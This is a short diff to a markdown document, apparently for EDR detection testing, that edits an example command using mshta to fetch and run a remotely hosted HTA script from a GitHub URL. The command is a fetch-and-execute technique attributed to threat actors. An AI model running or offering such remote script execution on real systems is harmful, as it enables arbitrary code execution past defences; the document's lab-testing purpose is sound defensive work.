@@ -5,7 +5,7 @@ Threat Actors can run HTA scripts on windows devices that are remotely hosted by
 
 Example Command:
 ```
-mshta https://raw.githubusercontent.com/MalwareLab49/HTA_calc/main/HTA_calc
+mshta https://raw.githubusercontent.com/MalwareLab49/HTA_calc/main/HTA_calc.hta
 ```
 
 The intent of this content is to allow for testing in a lab enviornment with EDR deployed to confirm that custiom detections are working as intended.
